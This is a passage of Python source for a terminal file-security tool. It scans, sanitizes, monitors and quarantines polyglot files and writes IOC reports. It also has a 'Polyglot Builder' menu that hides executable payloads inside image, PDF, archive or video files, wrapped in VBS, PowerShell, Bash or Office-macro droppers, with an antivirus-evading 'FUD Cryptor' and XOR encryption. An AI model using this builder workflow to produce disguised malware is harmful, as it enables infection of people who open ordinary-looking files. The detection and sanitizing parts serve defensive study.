                        for dom, _ in domain_re.findall(text):
                            ioc_domains.add(dom.lower())
                        for url in url_re.findall(text):
                            ioc_urls.add(url[:200])
                    except Exception:
                        pass

                # ── Section 6: Quarantine ──
                if want("6") and all_findings:
                    try:
                        if self.quarantine_mgr:
                            for fq, fnd in all_findings:
                                if fq == fpath:
                                    scan_result = self._findings_to_scan_result(fpath, fnd)
                                    crit_only = [f for f in fnd if f.get('severity') in ('critical','high')]
                                    if crit_only:
                                        qid = self.quarantine_mgr.quarantine(fpath, scan_result, force=True)
                                        if qid:
                                            quarantine_count += 1
                                            rpt(f"  [LOCKED] {fname} quarantined (ID: {qid})")
                    except Exception:
                        pass

                progress.advance(task)

        # ── Section 2: Sanitizer ──
        if want("2"):
            try:
                from engines.sanitizer import PolyglotSanitizer
                s = PolyglotSanitizer()
                rpt()
                rpt("-" * 70)
                rpt("  SANITIZATION RESULTS")
                rpt("-" * 70)
                for fpath in files:
                    fname = os.path.basename(fpath)
                    try:
                        result = s.sanitize(fpath, backup=True)
                        if result.get('status') == 'sanitized':
                            sanitize_count += 1
                            rpt(f"  [SANITIZED] {fname} — {result.get('detail', '')}")
                        elif result.get('safe_metadata'):
                            rpt(f"  [SAFE] {fname} — {result.get('detail', '')} (metadata only)")
                        else:
                            rpt(f"  [OK] {fname} — {result.get('detail', 'no issues')}")
                    except Exception as e:
                        rpt(f"  [ERR] {fname} — {e}")
            except ImportError:
                rpt("  [!] Sanitizer engine not available")

        # ── Section 5: Blue Side Indicators ──
        if want("5"):
            try:
                from engines.blue_side import BlueSideEngine
                bs = BlueSideEngine()
                rpt()
                rpt("-" * 70)
                rpt("  BLUE SIDE INDICATORS")
                rpt("-" * 70)
                indicators = bs.analyze_directory(os.path.abspath(target))
                if indicators:
                    for ind in indicators:
                        rpt(f"  [{ind.get('severity','info').upper()}] {ind.get('type','')}: {ind.get('detail','')}")
                else:
                    rpt("  No blue-side indicators detected.")
            except ImportError:
                rpt("  [!] Blue Side engine not available")

        # ── Network IOCs Summary ──
        if want("4") and (ioc_ips or ioc_domains or ioc_urls):
            rpt()
            rpt("-" * 70)
            rpt("  NETWORK IOCs (Indicators of Compromise)")
            rpt("-" * 70)
            if ioc_ips:
                rpt(f"  IPs ({len(ioc_ips)}):")
                for ip in sorted(ioc_ips)[:50]:
                    rpt(f"    {ip}")
            if ioc_domains:
                rpt(f"  Domains ({len(ioc_domains)}):")
                for dom in sorted(ioc_domains)[:50]:
                    rpt(f"    {dom}")
            if ioc_urls:
                rpt(f"  URLs ({len(ioc_urls)}):")
                for url in sorted(ioc_urls)[:30]:
                    rpt(f"    {url}")

        # ── Final Summary ──
        rpt()
        rpt("=" * 70)
        rpt("  SUMMARY")
        rpt("=" * 70)
        rpt(f"  Files scanned   : {len(files)}")
        rpt(f"  Threats found   : {total_threats}")
        rpt(f"  Warnings        : {total_warnings}")
        rpt(f"  Clean           : {total_clean}")
        if sanitize_count:
            rpt(f"  Sanitized       : {sanitize_count}")
        if quarantine_count:
            rpt(f"  Quarantined     : {quarantine_count}")
        if ioc_ips:
            rpt(f"  IOC IPs         : {len(ioc_ips)}")
        if ioc_domains:
            rpt(f"  IOC Domains     : {len(ioc_domains)}")
        if ioc_urls:
            rpt(f"  IOC URLs        : {len(ioc_urls)}")
        rpt()

        if total_threats > 0:
            rpt("  ⚠  ACTION REQUIRED: Critical/High threats detected!")
            rpt("  ⚠  Review the findings above and take appropriate action.")
        else:
            rpt("  ✅ No critical threats detected.")
        rpt()
        rpt("=" * 70)
        rpt(f"  Report saved to: {report_path}")
        rpt("=" * 70)

        # Write report file
        with open(report_path, 'w') as f:
            f.write('\n'.join(report_lines))

        # Display summary to console
        console.print()
        console.print(Panel(
            f"[bold]📊 REPORT COMPLETE[/bold]\n\n"
            f"  Files scanned : {len(files)}\n"
            f"  Threats       : [red]{total_threats}[/red]\n"
            f"  Warnings      : [yellow]{total_warnings}[/yellow]\n"
            f"  Clean         : [green]{total_clean}[/green]\n"
            f"  Sanitized     : {sanitize_count}\n"
            f"  Quarantined   : {quarantine_count}\n"
            f"  IOC IPs       : {len(ioc_ips)}\n"
            f"  IOC Domains   : {len(ioc_domains)}\n"
            f"  IOC URLs      : {len(ioc_urls)}\n\n"
            f"  Report saved to:\n  [cyan]{report_path}[/cyan]",
            border_style="green" if total_threats == 0 else "red",
            title="Report"
        ))

        # Notification
        if total_threats > 0:
            Notifier.send("SECURITY REPORT", f"{total_threats} threats in {len(files)} files!", "critical")
        else:
            Notifier.send("SECURITY REPORT", f"All {len(files)} files clean", "normal")

    def main_menu(self):
        self.banner()
        while True:
            console.print()
            console.print(Panel.fit(
                "[bold white]MAIN MENU[/bold white]\n"
                "[dim]─────────────────────────────────────[/dim]\n\n"
                "  [bold red]1[/bold red] │ ◆  [white]Polyglot Builder[/white]\n"
                "  [bold red]2[/bold red] │ ⚠  [white]File Detector[/white]\n"
                "  [bold red]3[/bold red] │ 🛡  [white]File Sanitizer[/white]\n"
                "  [bold red]4[/bold red] │ ▶  [white]Real-Time Monitor[/white]\n"
                "  [bold red]5[/bold red] │ 📊 [white]Dashboard & Stats[/white]\n"
                "  [bold red]6[/bold red] │ 📋 [white]Activity Log[/white]\n"
                "  [bold red]7[/bold red] │ 🔓 [white]Recover .bak Files[/white]\n"
                "  [bold red]8[/bold red] │ 🖥  [white]Server Mode[/white]\n"
                "  [bold red]9[/bold red] │ 🔬 [white]Deep Analysis[/white]\n"
                "  [bold red]10[/bold red] │ 📡 [white]Monitoring Panel[/white]\n"
                "  [bold red]11[/bold red] │ 🔍 [white]Investigation Panel[/white]\n"
                "  [bold red]12[/bold red] │ 🧪 [white]Benchmark & Fuzzing[/white]\n"
                "  [bold red]13[/bold red] │ 🏠 [white]Session & Workspace[/white]\n"
                "  [bold red]14[/bold red] │ 🌐 [white]Network Tools[/white]\n"
                "  [bold red]15[/bold red] │ 🔢 [white]Hex Editor[/white]\n"
                "  [bold red]16[/bold red] │ 🔵 [white]Blue Side Monitoring[/white]\n"
                "  [bold red]17[/bold red] │ 🔒 [white]Quarantine Vault[/white]\n"
                "  [bold red]18[/bold red] │ 📊 [white]Comprehensive Report[/white]\n"
                "  [bold red]0[/bold red] │ ✕  [dim]Exit[/dim]\n",
                title="[bold red]◆ POLYGLOT[/bold red]",
                subtitle="[dim]v3.0 — Red Team + Shield Edition[/dim]",
                border_style="red",
                padding=(1, 2),
            ))

            choice = self.safe_input("\n[bold red]Select[/bold red]",
                                     choices=["0","1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18"],
                                     default="1")
            if choice is None:
                continue

            if choice == "0":
                console.print("\n[dim]Stay stealthy. ── Mr-DS-ML-85[/dim]\n")
                sys.exit(0)
            elif choice == "1":
                self._safe_menu_call(self.menu_builder)
            elif choice == "2":
                self._safe_menu_call(self.menu_detector)
            elif choice == "3":
                self._safe_menu_call(self.menu_sanitizer)
            elif choice == "4":
                self._safe_menu_call(self.menu_monitor)
            elif choice == "5":
                self._safe_menu_call(self.menu_dashboard)
            elif choice == "6":
                self._safe_menu_call(self.menu_log)
            elif choice == "7":
                self._safe_menu_call(self.menu_recover)
            elif choice == "8":
                self._safe_menu_call(self.menu_server)
            elif choice == "9":
                self._safe_menu_call(self.menu_deep_analysis)
            elif choice == "10":
                self._safe_menu_call(self.menu_monitoring)
            elif choice == "11":
                self._safe_menu_call(self.menu_investigation)
            elif choice == "12":
                self._safe_menu_call(self.menu_benchmark)
            elif choice == "13":
                self._safe_menu_call(self.menu_session_workspace)
            elif choice == "14":
                self._safe_menu_call(self.menu_network_tools)
            elif choice == "15":
                self._safe_menu_call(self.menu_hex_editor)
            elif choice == "16":
                self._safe_menu_call(self.menu_blue_side)
            elif choice == "17":
                self._safe_menu_call(self.menu_quarantine)
            elif choice == "18":
                self._safe_menu_call(self.menu_report)

    # ── Builder Menu ─────────────────────────────────────────

    def menu_builder(self):
        console.print()
        console.print(Panel("[bold red]◆ POLYGLOT BUILDER[/bold red]", border_style="red"))
        console.print(f"  {DISCLAIMER_TUI}\n")

        console.print("[bold]Attack Vectors:[/bold]")
        console.print("  [red]1[/red] │ Standard Polyglot (trailing data)")
        console.print("  [red]2[/red] │ FUD Cryptor (multi-layer obfuscation)")
        console.print("  [red]3[/red] │ MIME-Type Confusion")
        console.print("  [red]4[/red] │ Covert Archive Embedding")

        vector = self.safe_input("\n[bold red]Vector[/bold red]", choices=["1","2","3","4"], default="1")
        if vector is None: return

        cover = self.safe_input("[bold cyan]Cover file[/bold cyan] (JPEG/PNG/GIF/PDF/ZIP/MP4)")
        if cover is None: return
        if not os.path.isfile(cover):
            console.print(f"[red]✗ File not found: {cover}[/red]")
            return

        payload = self.safe_input("[bold cyan]Payload file[/bold cyan] (EXE/ELF/script)")
        if payload is None: return
        if not os.path.isfile(payload):
            console.print(f"[red]✗ File not found: {payload}[/red]")
            return

        containers = ['jpeg','png','gif','pdf','zip','mp4']
        container = self.safe_input("[bold cyan]Container type[/bold cyan]", choices=containers, default="jpeg")
        if container is None: return

        # Cross-platform payload wrapping
        console.print("\n[bold]Payload Wrapping:[/bold]")
        console.print("  [dim]0[/dim] │ None (raw embed)")
        console.print("  [red]1[/red] │ VBS dropper (Windows)")
        console.print("  [red]2[/red] │ PowerShell dropper (Windows)")
        console.print("  [red]3[/red] │ Bash dropper (Linux/macOS)")
        console.print("  [red]4[/red] │ POSIX sh dropper (Linux/macOS)")
        console.print("  [red]5[/red] │ Python dropper (cross-platform)")
        console.print("  [red]6[/red] │ AppleScript dropper (macOS)")
        console.print("  [red]7[/red] │ Excel macro (.xlsx)")
        console.print("  [red]8[/red] │ Word macro (.docx)")

        wrap_choice = self.safe_input("[bold cyan]Wrap type[/bold cyan]",
                                       choices=["0","1","2","3","4","5","6","7","8"], default="0")
        if wrap_choice is None: return

        payload_type_map = {
            "0": None, "1": "vbs", "2": "ps1", "3": "bash",
            "4": "sh", "5": "python", "6": "applescript",
            "7": "xlsx", "8": "docx",
        }
        payload_type = payload_type_map.get(wrap_choice)
        target_os = "windows"
        if payload_type in ('bash', 'sh', 'python', 'applescript'):
            target_os = "linux"
        elif payload_type in ('xlsx', 'docx'):
            target_os = self.safe_input("[bold cyan]Target OS[/bold cyan]",
                                         choices=["windows","macos"], default="windows")
            if target_os is None: return

        # Architecture selection
        arch_choices = {
            "1": "x86-64", "2": "arm64", "3": "arm32",
        }
        arch = self.safe_input(
            "[bold cyan]Architecture[/bold cyan]\n"
            "  [cyan]1[/cyan] → x86-64 (default)\n"
            "  [cyan]2[/cyan] → ARM64 (AArch64)\n"
            "  [cyan]3[/cyan] → ARM32 (ARMv7, Linux only)",
            choices=["x86-64", "arm64", "arm32"], default="x86-64")
        if arch is None: return
        # Validate arm32 only for linux
        if arch == 'arm32' and target_os != 'linux':
            console.print("[bold red]✗ ARM32 only supported on Linux[/bold red]")
            return

        encrypt = self.safe_confirm("[bold cyan]XOR encrypt payload?[/bold cyan]", default=False)
        if encrypt is None: return
        fud = vector == "2"
        mime = vector == "3"

        output = self.safe_input("[bold cyan]Output file[/bold cyan]", default=f"polyglot.{container}")
        if output is None: return

        console.print()
        with Progress(SpinnerColumn(), TextColumn("[bold blue]{task.description}"),
                     BarColumn(), TaskProgressColumn(), console=console) as progress:
            task = progress.add_task("Building polyglot...", total=100)
            try:
                progress.update(task, advance=30)
                stats = self.builder.build(cover, payload, output,
                    container_type=container, encrypt=encrypt, fud=fud, mime_confuse=mime,
                    payload_type=payload_type, target_os=target_os, arch=arch)
                progress.update(task, advance=70)
            except Exception as e:
                console.print(f"\n[bold red]✗ ERROR: {e}[/bold red]")
                return

        progress.update(task, completed=100)

        console.print()
        table = Table(title="Build Result", box=box.ROUNDED, border_style="green")
        table.add_column("Property", style="cyan")
        table.add_column("Value", style="white")
        table.add_row("Output", stats['output'])
        table.add_row("Container", stats['container_type'])
        table.add_row("Cover Size", f"{stats['cover_size']:,} bytes")
        table.add_row("Payload Size", f"{stats['payload_size']:,} bytes")
        table.add_row("Output Size", f"{stats['output_size']:,} bytes")
        table.add_row("Payload Offset", f"0x{stats['payload_offset']:X}")
        table.add_row("Entropy", str(stats['entropy']))
        table.add_row("Encrypted", "✓" if stats['encrypted'] else "✗")
        table.add_row("FUD Protected", "✓" if stats['fud_protected'] else "✗")
        table.add_row("MIME Confusion", "✓" if stats['mime_confused'] else "✗")
        console.print(table)

        self.stats['built'] += 1
        console.print(f"\n[bold green]✓ Polyglot built successfully![/bold green]")
        Notifier.send("Polyglot Built", f"{container} polyglot created")

    # ── Detector Menu ────────────────────────────────────────

    def menu_detector(self):
        console.print()
        console.print(Panel("[bold yellow]⚠ POLYGLOT DETECTOR[/bold yellow]", border_style="yellow"))
        console.print("  [dim]Note: May produce false positives — always verify findings[/dim]\n")

        target = self.safe_input("[bold cyan]Target[/bold cyan] (file or directory)")
        if target is None: return
        if not os.path.exists(target):
            console.print(f"[red]✗ Not found: {target}[/red]")
            return

        if os.path.isfile(target):
            files = [target]
        else:
            exts = {'.jpg','.jpeg','.png','.gif','.bmp','.pdf','.doc','.docx',
                    '.zip','.exe','.dll','.bat','.cmd','.ps1','.vbs','.js','.mp4',
                    '.sh','.bash','.py','.rb','.pl','.applescript','.scpt',
                    '.xlsx','.xls','.pptx','.ppt','.rtf','.html','.hta','.wsf',
                    '.7z','.rar','.iso','.elf','.so','.dylib','.macho'}
            files = []
            for root, dirs, fnames in os.walk(target):
                dirs[:] = [d for d in dirs if not d.startswith('.')]
                for f in fnames:
                    if os.path.splitext(f)[1].lower() in exts:
                        files.append(os.path.join(root, f))

        if not files:
            console.print("[yellow]No scannable files found.[/yellow]")
            return

        console.print(f"\n[dim]Scanning {len(files)} files...[/dim]\n")

        # Try to load ML model
        ml_model = None
        try:
            from engines.model import PolyglotModel
            from engines.features import extract_features_from_file
            from pathlib import Path
            mpath = "models/polyglot_shield.cbm"
            if Path(mpath).exists():
                ml_model = PolyglotModel({'task_type': 'CPU'})
                ml_model.load(mpath)
        except Exception:
            pass

        threats = 0
        threat_files = []  # Collect files with critical/high threats for quarantine
        with Progress(SpinnerColumn(), TextColumn("[bold]{task.description}"),
                     BarColumn(), TaskProgressColumn(), console=console) as progress:
            task = progress.add_task("Scanning...", total=len(files))

            for fpath in files:
                fname = os.path.basename(fpath)
                try:
                    findings = self.detector.scan_file(fpath)
                    self.stats['scanned'] += 1

                    # ML prediction
                    ml_str = ""
                    if ml_model and ml_model.is_loaded:
                        try:
                            feats = extract_features_from_file(fpath)
                            pred = ml_model.predict_single(feats)
                            ml_str = f"  [dim]ML: {pred['label']} {pred['risk_score']:.1f}% ({pred['risk_level']})[/dim]"
                        except Exception:
                            pass

                    if findings:
                        crit = [f for f in findings if f['severity'] in ('critical','high')]
                        if crit:
                            threats += len(crit)
                            self.stats['threats'] += len(crit)
                            threat_files.append((fpath, findings))
                            console.print(f"  [bold red]⚠ {fname}[/bold red]")
                            for f in findings:
                                sev = f['severity']
                                styles = {'critical':'bold white on red','high':'bold red',
                                         'warning':'yellow','info':'blue'}
                                off = f" @ 0x{f['offset']:X}" if f.get('offset') else ""
                                console.print(f"    [{styles.get(sev,'white')}][{sev.upper()}][/{styles.get(sev,'white')}] "
                                            f"{f['type']}: {f['detail']}{off}")
                            if ml_str:
                                console.print(f"   {ml_str}")
                        else:
                            console.print(f"  [yellow]○ {fname}[/yellow] [dim]— minor warnings[/dim]")
                            if ml_str:
                                console.print(f"   {ml_str}")
                    else:
                        console.print(f"  [green]✓ {fname}[/green] [dim]— clean[/dim]")
                        if ml_str:
                            console.print(f"   {ml_str}")
                except Exception as e:
                    console.print(f"  [red]✗ {fname}[/red] [dim]— error: {e}[/dim]")

                progress.advance(task)

        console.print()
        if threats > 0:
            console.print(Panel(
                f"[bold red]⚠ {threats} THREATS FOUND[/bold red]\n"
                f"[dim]{len(files)} files scanned[/dim]\n"
                f"[yellow]⚠ Verify findings before taking action — false positives are possible[/yellow]",
                border_style="red", title="Scan Complete"
            ))
            Notifier.send("THREATS DETECTED", f"{threats} threats in {len(files)} files", "critical")
            self.alerts.append({"time": datetime.now().strftime('%H:%M:%S'), "file": f"{threats} threats", "severity": "critical", "detail": f"{threats} threats in {len(files)} files"})

            # Offer quarantine for files with critical/high findings
            if threat_files and self.quarantine_mgr:
                console.print()
                q_choice = self.safe_input(
                    "[bold cyan]Quarantine threats?[/bold cyan] "
                    "[dim]([green]a[/green]=all, [yellow]i[/yellow]=interactive, [red]n[/red]=skip)[/dim]",
                    default="n", choices=["a", "i", "n"]
                )
                if q_choice == "a":
                    for fpath, findings in threat_files:
                        scan_result = self._findings_to_scan_result(fpath, findings)
                        qid = self.quarantine_mgr.quarantine(fpath, scan_result, force=True)
                        if qid:
                            console.print(f"    [red]🔒 Quarantined[/red] {os.path.basename(fpath)} [dim](ID: {qid})[/dim]")
                        else:
                            console.print(f"    [yellow]⚠ Skipped[/yellow] {os.path.basename(fpath)}")
                elif q_choice == "i":
                    for fpath, findings in threat_files:
                        fname = os.path.basename(fpath)
                        do_q = self.safe_confirm(f"  Quarantine [red]{fname}[/red]?", default=True)
                        if do_q:
                            scan_result = self._findings_to_scan_result(fpath, findings)
                            qid = self.quarantine_mgr.quarantine(fpath, scan_result, force=True)
                            if qid:
                                console.print(f"    [red]🔒 Quarantined[/red] {fname} [dim](ID: {qid})[/dim]")
                            else:
                                console.print(f"    [yellow]⚠ Failed[/yellow] {fname}")
        else:
            console.print(Panel(
                f"[bold green]✓ ALL CLEAN[/bold green]\n"
                f"[dim]{len(files)} files scanned, no threats[/dim]",
                border_style="green", title="Scan Complete"
            ))

    # ── Sanitizer Menu ───────────────────────────────────────

    def menu_sanitizer(self):
        console.print()
        console.print(Panel("[bold green]🛡 POLYGLOT SANITIZER[/bold green]", border_style="green"))
        console.print("  [dim]Strips hidden data after file end markers (%%EOF, IEND, etc.)[/dim]")
        console.print("  [yellow]⚠ Creates .bak backups by default — keep them until verified[/yellow]\n")

        target = self.safe_input("[bold cyan]Target[/bold cyan] (file or directory)")
        if target is None: return
        if not os.path.exists(target):
            console.print(f"[red]✗ Not found: {target}[/red]")
            return

        dry_run = self.safe_confirm("[bold cyan]Dry-run mode (preview only)?[/bold cyan]", default=False)
        if dry_run is None: return

        backup = True
        if not dry_run:
            backup = self.safe_confirm("[bold cyan]Create .bak backups?[/bold cyan]", default=True)
            if backup is None: return

        if os.path.isfile(target):
            files = [target]
        else:
            exts = {'.jpg','.jpeg','.png','.gif','.bmp','.pdf','.zip','.mp4',
                    '.sh','.bash','.py','.rb','.pl','.applescript','.scpt',
                    '.xlsx','.docx','.7z','.rar','.iso'}
            files = []
            for root, dirs, fnames in os.walk(target):
                dirs[:] = [d for d in dirs if not d.startswith('.')]
                for f in fnames:
                    if os.path.splitext(f)[1].lower() in exts:
                        files.append(os.path.join(root, f))

        if not files:
            console.print("[yellow]No sanitizable files found.[/yellow]")
            return

        if dry_run:
            console.print("[bold cyan]  [DRY-RUN MODE — no files will be modified][/bold cyan]\n")

        console.print(f"[dim]{'Previewing' if dry_run else 'Sanitizing'} {len(files)} files...[/dim]\n")

        sanitized = 0
        total_removed = 0

        with Progress(SpinnerColumn(), TextColumn("[bold]{task.description}"),
                     BarColumn(), TaskProgressColumn(), console=console) as progress:
            task = progress.add_task("Scanning..." if dry_run else "Sanitizing...", total=len(files))

            for fpath in files:
                fname = os.path.basename(fpath)
                try:
                    result = self.sanitizer.sanitize(fpath, backup and not dry_run)
                    if result.get('safe_metadata'):
                        console.print(f"  [dim]○ {fname} — {result['detail']} (safe)[/dim]")
                    elif result['status'] == 'sanitized':
                        sanitized += 1
                        total_removed += result['removed']
                        if not dry_run:
                            self.stats['sanitized'] += 1
                        prefix = "[DRY-RUN] " if dry_run else ""
                        console.print(f"  [green]{'✓' if not dry_run else '○'} {prefix}{fname}[/green] — {result['detail']}")
                    else:
                        console.print(f"  [dim]○ {fname} — {result['detail']}[/dim]")
                except Exception as e:
                    console.print(f"  [red]✗ {fname} — {e}[/red]")
                progress.advance(task)

        console.print()
        mode = "[DRY-RUN] " if dry_run else ""
        if sanitized > 0:
            console.print(Panel(
                f"[bold green]{mode}🛡 {'Would sanitize' if dry_run else 'SANITIZED'}[/bold green]\n"
                f"[white]{sanitized}/{len(files)} files {'affected' if dry_run else 'cleaned'}[/white]\n"
                f"[dim]{total_removed:,} bytes of hidden data {'would be removed' if dry_run else 'removed'}[/dim]"
                + ("\n[yellow]⚠ .bak backups created — verify before deleting them[/yellow]" if not dry_run and backup else ""),
                border_style="green", title=f"{mode}Sanitization {'Preview' if dry_run else 'Complete'}"
            ))
            if not dry_run:
                Notifier.send("Sanitization Done", f"{sanitized} files cleaned")
        else:
            console.print(Panel(
                f"[bold blue]✓ ALL CLEAN[/bold blue]\n[dim]No hidden data found[/dim]",
                border_style="blue", title=f"{mode}Sanitization {'Preview' if dry_run else 'Complete'}"
            ))

    # ── Monitor Menu ─────────────────────────────────────────

    def menu_monitor(self, cli_directory=None):
        console.print()
        console.print(Panel("[bold cyan]▶ REAL-TIME MONITOR[/bold cyan]", border_style="cyan"))
        console.print("  [dim]Monitors directory for new/changed files and scans them[/dim]\n")

        if cli_directory:
            directory = cli_directory
        else:
            directory = self.safe_input("[bold cyan]Watch directory[/bold cyan]",
                                       default=str(Path.home() / "Downloads"))
            if directory is None: return
        if not os.path.isdir(directory):
            console.print(f"[red]✗ Not a directory: {directory}[/red]")
            return

        console.print(f"\n[green]▶ Monitoring: {directory}[/green]")
        console.print("[dim]Press Ctrl+C to stop[/dim]\n")

        detector = self.detector
        file_hashes = {}
        scanned = 0
        threats = 0
        threat_files = []  # Track files with critical/high threats for quarantine
        threat_seen = set()  # O(1) duplicate check

        scan_exts = {'.jpg','.jpeg','.png','.gif','.bmp','.pdf','.doc','.docx',
                     '.zip','.exe','.dll','.scr','.bat','.cmd','.ps1','.vbs',
                     '.js','.hta','.lnk','.elf','.so','.mp4'}

        try:
            while True:
                for root, dirs, files in os.walk(directory):
                    dirs[:] = [d for d in dirs if not d.startswith('.')]
                    for fname in files:
                        ext = os.path.splitext(fname)[1].lower()
                        if ext not in scan_exts:
                            continue
                        fpath = os.path.join(root, fname)
                        try:
                            st = os.stat(fpath)
                            cur = (st.st_mtime, st.st_size)
                        except OSError:
                            continue

                        prev = file_hashes.get(fpath)
                        if prev is None or prev != cur:
                            file_hashes[fpath] = cur
                            try:
                                findings = detector.scan_file(fpath)
                            except Exception:
                                continue
                            scanned += 1
                            self.stats['scanned'] += 1

                            crit = [f for f in findings if f['severity'] in ('critical','high')]
                            if crit:
                                threats += len(crit)
                                self.stats['threats'] += len(crit)
                                if fpath not in threat_seen:
                                    threat_seen.add(fpath)
                                    threat_files.append((fpath, findings))
                                ts = datetime.now().strftime('%H:%M:%S')
                                console.print(f"[bold red]  [{ts}] ⚠ {fname}[/bold red]")
                                for f in crit[:3]:
                                    console.print(f"    [red]→ {f['detail']}[/red]")
                                Notifier.send(f"THREAT: {fname}", crit[0]['detail'][:100], "critical")
                                self.alerts.append({"time": ts, "file": fname, "severity": "critical", "detail": crit[0]['detail'][:100]})
                            elif not findings:
                                console.print(f"  [dim]✓ {fname}[/dim]")

                time.sleep(3)
        except KeyboardInterrupt:
            console.print(f"\n\n[dim]Stopped. Scanned: {scanned} | Threats: {threats}[/dim]")

            # Offer quarantine for monitored threats
            if threat_files and self.quarantine_mgr:
                console.print(f"\n  [bold red]{len(threat_files)} files had threats:[/bold red]")
                for fpath, _ in threat_files:
                    console.print(f"    [red]⚠ {os.path.basename(fpath)}[/red]")
                q_choice = self.safe_input(
                    "[bold cyan]Quarantine?[/bold cyan] "
                    "[dim]([green]a[/green]=all, [yellow]i[/yellow]=interactive, [red]n[/red]=skip)[/dim]",
                    default="n", choices=["a", "i", "n"]
                )
                if q_choice == "a":
                    for fpath, findings in threat_files:
                        scan_result = self._findings_to_scan_result(fpath, findings)
                        qid = self.quarantine_mgr.quarantine(fpath, scan_result, force=True)
                        if qid:
                            console.print(f"    [red]🔒 Quarantined[/red] {os.path.basename(fpath)} [dim](ID: {qid})[/dim]")
                elif q_choice == "i":
                    for fpath, findings in threat_files:
                        fname = os.path.basename(fpath)
                        do_q = self.safe_confirm(f"  Quarantine [red]{fname}[/red]?", default=True)
                        if do_q:
                            scan_result = self._findings_to_scan_result(fpath, findings)
                            qid = self.quarantine_mgr.quarantine(fpath, scan_result, force=True)
                            if qid:
                                console.print(f"    [red]🔒 Quarantined[/red] {fname} [dim](ID: {qid})[/dim]")

    # ── Dashboard ────────────────────────────────────────────

    def menu_dashboard(self):
        console.print()
        table = Table(title="📊 Dashboard", box=box.DOUBLE_EDGE, border_style="red",
                     title_style="bold white", padding=(0, 2))
        table.add_column("Metric", style="cyan", justify="right")
        table.add_column("Value", style="bold white", justify="center")
        table.add_column("Status", justify="center")

        s = self.stats
        table.add_row("🔍 Files Scanned", str(s['scanned']),
                     "[green]✓[/green]" if s['scanned'] > 0 else "[dim]—[/dim]")
        table.add_row("⚠ Threats Found", str(s['threats']),
                     "[red]⚠ ALERT[/red]" if s['threats'] > 0 else "[green]CLEAN[/green]")
        table.add_row("🛡 Files Sanitized", str(s['sanitized']),
                     "[green]✓[/green]" if s['sanitized'] > 0 else "[dim]—[/dim]")
        table.add_row("◆ Polyglots Built", str(s['built']),
                     "[yellow]●[/yellow]" if s['built'] > 0 else "[dim]—[/dim]")

        console.print(table)

        if self.alerts:
            console.print("\n[bold]Recent Alerts:[/bold]")
            for alert in list(self.alerts)[-10:]:
                console.print(f"  [red]⚠ {alert}[/red]")

    # ── Log ──────────────────────────────────────────────────

    def menu_log(self):
        console.print()
        if not self.alerts:
            console.print("[dim]No activity logged yet.[/dim]")
            return
        console.print(Panel("[bold]📋 Activity Log[/bold]", border_style="blue"))
        for entry in list(self.alerts):
            console.print(f"  {entry}")

    # ── Recovery Menu ────────────────────────────────────────

    def menu_recover(self):
        console.print()
        console.print(Panel("[bold cyan]🔓 RECOVER .BAK FILES[/bold cyan]", border_style="cyan"))
        console.print("  [dim]Restores files from .bak backups created by the sanitizer[/dim]\n")

        target = self.safe_input("[bold cyan]Directory to scan for .bak files[/bold cyan]")
        if target is None: return
        if not os.path.isdir(target):
            console.print(f"[red]✗ Not a directory: {target}[/red]")
            return

        dest_dir = self.safe_input("[bold cyan]Restore to (leave empty = original location)[/bold cyan]", default="")
        if dest_dir is None: return
        dest_dir = dest_dir.strip() or None

        # Find all .bak files
        bak_files = []
        for root, dirs, fnames in os.walk(target):
            dirs[:] = [d for d in dirs if not d.startswith('.')]
            for f in fnames:
                if f.endswith('.bak'):
                    bak_files.append(os.path.join(root, f))

        if not bak_files:
            console.print("[yellow]No .bak backup files found.[/yellow]")
            return

        console.print(f"\n  Found {len(bak_files)} backup file(s):\n")
        for bak in bak_files:
            original = bak[:-4]
            fname = os.path.basename(original)
            fsize = os.path.getsize(bak)
            console.print(f"  📄 {fname} ({fsize:,} bytes)")

        confirm = self.safe_confirm(f"\n[bold yellow]Restore all {len(bak_files)} files?[/bold yellow]", default=True)
        if not confirm:
            console.print("[dim]Cancelled.[/dim]")
            return

        restored = 0
        for bak in bak_files:
            original = bak[:-4]
            fname = os.path.basename(original)
            try:
                if dest_dir:
                    os.makedirs(dest_dir, exist_ok=True)
                    dest = os.path.join(dest_dir, fname)
                else:
                    dest = original
                shutil.copy2(bak, dest)
                console.print(f"  [green]✓ Restored: {fname}[/green]")
                restored += 1
            except Exception as e:
                console.print(f"  [red]✗ Failed: {fname} — {e}[/red]")

        console.print(f"\n  [bold]Restored {restored}/{len(bak_files)} files[/bold]")

    # ── Server Menu ──────────────────────────────────────────

    def menu_server(self):
        console.print()
        console.print(Panel("[bold cyan]🖥 SERVER MODE[/bold cyan]", border_style="cyan"))
        console.print("  [dim]Headless API + Web Dashboard[/dim]\n")

        port = self.safe_input("[bold cyan]Port[/bold cyan]", default="8888")
        if port is None: return
        host = self.safe_input("[bold cyan]Bind address[/bold cyan] (127.0.0.1 or 0.0.0.0)", default="127.0.0.1")
        if host is None: return

        console.print(f"\n[green]▶ Starting server on {host}:{port}[/green]")
        console.print("[dim]Press Ctrl+C to stop[/dim]\n")

        try:
            from server import main as server_main
            old_argv = sys.argv
            sys.argv = ['server.py', '--host', host, '--port', str(port)]
            try:
                server_main()
            finally:
                sys.argv = old_argv
        except KeyboardInterrupt:
            console.print("\n\n[dim]Server stopped.[/dim]")
        except ImportError as e:
            console.print(f"[red]✗ Server dependencies not available: {e}[/red]")
            console.print("[dim]Install: pip install flask[/dim]")
        except Exception as e:
            console.print(f"[red]✗ Server error: {e}[/red]")

    # ── Deep Analysis Menu ───────────────────────────────────────

    def menu_deep_analysis(self):
        console.print()
        console.print(Panel("[bold cyan]🔬 DEEP ANALYSIS[/bold cyan]", border_style="cyan"))
        console.print("  [cyan]1[/cyan] │ 📋 Format Parser + Differential Analysis")
        console.print("  [cyan]2[/cyan] │ 🖼  Steganography Detection")
        console.print("  [cyan]3[/cyan] │ 💻 PE Anomaly Analysis")
        console.print("  [cyan]4[/cyan] │ 🐧 ELF Section Anomaly Detection")
        console.print("  [cyan]5[/cyan] │ 📄 Office Macro Static Analysis")
        console.print("  [cyan]6[/cyan] │ 📦 Archive Recursion + Container Nesting")
        console.print("  [cyan]7[/cyan] │ 🧠 ONNX Model Export")
        console.print("  [cyan]8[/cyan] │ 🔍 Full Analysis (all engines)")

        choice = self.safe_input("\n[bold cyan]Select[/bold cyan]",
                                 choices=["1","2","3","4","5","6","7","8"], default="8")
        if choice is None: return

        target = self.safe_input("[bold cyan]Target file/directory[/bold cyan]")
        if target is None: return
        if not os.path.exists(target):
            console.print(f"[red]✗ Not found: {target}[/red]")
            return

